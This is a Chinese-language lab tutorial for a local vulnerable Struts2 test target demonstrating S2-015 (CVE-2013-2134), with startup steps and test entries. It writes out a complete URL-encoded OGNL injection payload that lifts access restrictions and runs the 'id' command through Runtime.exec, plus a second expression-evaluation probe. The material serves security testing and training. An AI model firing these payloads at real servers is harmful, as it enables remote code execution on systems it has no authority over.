# struts2-s2-015 操作教程

- 类型：单体靶场
- 目录：`struts2-s2-015`
- 端口：`9958`
- 推荐入口：`/index.action`

## 这是什么

Struts2 `S2-015 / CVE-2013-2134` 演示靶场。这个模块同时放了两种常见利用面：

1. Action 通配符 `*` 配合结果 `/{1}.jsp`
2. result 参数里通过 `${message}` 做二次引用

两者都会在不同阶段把用户可控内容再次送入 OGNL 解析。

## 启动前准备

1. 在仓库根目录执行 `bash run-local-build.sh`。
2. 等待对应容器启动完成，并确认端口 `9958` 已经监听。
3. 如果你还想通过首页统一发包，再额外确认 `http://宿主机IP:5000/` 能打开。

## 方式一：通过页面点击测试

1. 打开 `http://宿主机IP:9958/index.action`。
2. 先点 `通配符场景回显 id`，观察 Action 名中夹带的 OGNL 是否被执行。
3. 再点 `Header 场景执行 7*7`，观察响应头中的 `x-s2-015`。

## 方式二：通过首页测试

1. 打开 `http://宿主机IP:5000/`。
2. 在搜索框输入 `struts2_s2_015、s2-015、struts2` 过滤到当前项目。
3. 先跑 `struts2_s2_015_attack_wildcard`。
4. 再跑 `struts2_s2_015_attack_header`。
5. 最后用 `struts2_s2_015_normal` 回到基线页面。

推荐直接使用的首页条目：
- `struts2_s2_015_attack_wildcard`：通配符结果映射执行 `id`
- `struts2_s2_015_attack_header`：二次引用执行 `%{7*7}`
- `struts2_s2_015_normal`：页面基线访问

## 方式三：直接访问接口测试

1. 通配符场景：

```bash
curl -i "http://宿主机IP:9958/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%2C%23b%3Dnew+java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew+java.io.BufferedReader%28%23b%29%2C%23d%3Dnew+char%5B256%5D%2C%23c.read%28%23d%29%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C%23out.println%28new+java.lang.String%28%23d%29%29%2C%23out.close%28%29%7D.action"
```

2. 二次引用 Header 场景：

```bash
curl -i "http://宿主机IP:9958/param.action?message=%25%7B7%2A7%7D"
```

3. 基线访问：

```bash
curl -i "http://宿主机IP:9958/index.action"
```

## 测试时重点看什么

1. Action 名中的通配符内容是否被当成 OGNL 解析。
2. `param.action` 返回头里的 `x-s2-015` 是否出现表达式计算结果。
3. 普通首页访问是否只显示说明页。

## 相关入口

- 总控台：`http://宿主机IP:5000/`
- 文档索引：[`doc/README.md`](../README.md)
- 根项目说明：[`README.md`](../../README.md)
